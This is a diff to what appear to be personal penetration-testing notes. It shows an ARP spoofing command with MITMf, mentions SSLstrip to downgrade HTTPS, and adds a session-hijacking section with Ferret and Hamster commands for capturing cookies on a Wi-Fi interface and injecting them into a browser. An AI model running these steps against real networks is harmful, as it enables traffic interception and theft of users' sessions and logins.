@@ -87,5 +87,15 @@ After authenticating to a network you gather information about it.
 * Tell the target client that I am router
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0`
 
-This way you can see all the post request made by the target client
-To bypass HTTPS request use SSLstrip to downgrade HTTPS to an HTTP request
+This way you can see all the post request made by the target client.
+
+To bypass HTTPS request use SSLstrip to downgrade HTTPS to an HTTP request.
+### Session Hijacking
+If the user clicks on the "remember me" button a cookie is made in the browser. So we sniff the cookies and inject them to our browser.
+* Install Ferret
+  * `apt-get install ferret-sidejack`
+* Become the MITM
+* Capture Cookies
+  * `ferret -i wlan0`
+* Web GUI to see the cookies and inject them into my browser
+  * `hamster`
